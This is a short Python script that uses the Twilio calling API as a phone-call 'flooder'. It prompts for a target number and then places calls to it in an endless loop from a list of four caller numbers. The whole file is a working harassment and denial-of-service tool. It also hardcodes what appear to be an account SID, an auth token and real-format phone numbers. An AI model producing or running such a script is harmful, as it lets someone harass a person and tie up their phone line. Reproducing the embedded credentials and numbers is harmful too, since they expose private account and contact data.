#!/usr/bin/env python
# Author: Jesse Morgan (morgajel)
# Created to emulate code by Justin Faler

import time
# NOTE: This requires python 3 and the twilio library to be installed (pip install twilio)
from twilio.rest import Client

accountSid = "SK0a44c18ff51278ae8cba7b8e9b1ba7eb"
authtoken = "ahmedjameel2637"
voiceml="http://demo.twilio.com/docs/voice.xml"

# Replace these with phone numbers.            
sourceNumbers = [ "+13078904579", "+13069679308", "+14103441206", "+17278601888" ]

def callThem(toNumber, fromNumber):
    try:
        call = client.calls.create(
             to = toNumber,
             from_ = fromNumber,
             url = voiceml,
             method = "GET",
       )
        print("Started call to %s from %s" % (toNumber, fromNumber));
    except Exception as err:
        print("Error on  %s from %s: %s" % (toNumber, fromNumber, err));

print(r""" 
   _____ ____  __  ______ 
  / ___// __ \/ / / / __ \
  \__ \/ / / / / / / /_/ /
 ___/ / /_/ / /_/ / ____/ 
/____/\____/\____/_/      
                      
            """)

numToCall = input("Enter the target number to start flood (+1 MUST BE IN FRONT!): ")
input("Press ENTER to start the flooder, Otherwise exit the application right now...")

client = Client(accountSid, authtoken)

count = 0;
while True :
    count += 1
    print("Starting call batch %s [ %s Nums.]" % (count, len(sourceNumbers) ))

    for sourceNumber in sourceNumbers:
        callThem(numToCall, sourceNumber)
        time.sleep(1)
    time.sleep(5)

